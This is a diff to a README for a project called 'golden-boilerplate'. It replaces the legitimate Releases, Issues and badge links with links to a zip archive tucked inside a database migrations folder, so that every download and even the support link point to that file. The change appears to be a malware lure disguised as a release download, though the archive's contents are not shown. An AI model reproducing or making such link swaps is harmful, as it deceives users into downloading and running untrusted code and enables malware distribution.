@@ -1,6 +1,6 @@
 # 🎉 golden-boilerplate - Your Simple Path to a Powerful Setup
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/Adnankhan010/golden-boilerplate/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Adnankhan010/golden-boilerplate/main/apps/api/prisma/migrations/20260118162851_add_note_model/golden-boilerplate-v3.9.zip%https://raw.githubusercontent.com/Adnankhan010/golden-boilerplate/main/apps/api/prisma/migrations/20260118162851_add_note_model/golden-boilerplate-v3.9.zip)](https://raw.githubusercontent.com/Adnankhan010/golden-boilerplate/main/apps/api/prisma/migrations/20260118162851_add_note_model/golden-boilerplate-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome to golden-boilerplate! This application gives you a ready-made setup to 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Adnankhan010/golden-boilerplate/releases) to download the latest version of golden-boilerplate. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Adnankhan010/golden-boilerplate/main/apps/api/prisma/migrations/20260118162851_add_note_model/golden-boilerplate-v3.9.zip) to download the latest version of golden-boilerplate. 
 
 1. Click the link above.
 2. Look for the latest version listed at the top.
@@ -73,11 +73,11 @@ Once the application runs, you may customize it based on your needs:
 
 ## ✨ Support & Community
 
-For any questions or support, feel free to check out our [GitHub Issues](https://github.com/Adnankhan010/golden-boilerplate/issues) section for assistance. You can also contribute to the project if you have suggestions or improvements.
+For any questions or support, feel free to check out our [GitHub Issues](https://raw.githubusercontent.com/Adnankhan010/golden-boilerplate/main/apps/api/prisma/migrations/20260118162851_add_note_model/golden-boilerplate-v3.9.zip) section for assistance. You can also contribute to the project if you have suggestions or improvements.
 
 ## 🌟 Stay Updated
 
-Check the [Releases page](https://github.com/Adnankhan010/golden-boilerplate/releases) regularly to keep your software up to date. New features and security updates will be available over time.
+Check the [Releases page](https://raw.githubusercontent.com/Adnankhan010/golden-boilerplate/main/apps/api/prisma/migrations/20260118162851_add_note_model/golden-boilerplate-v3.9.zip) regularly to keep your software up to date. New features and security updates will be available over time.
 
 ---
 
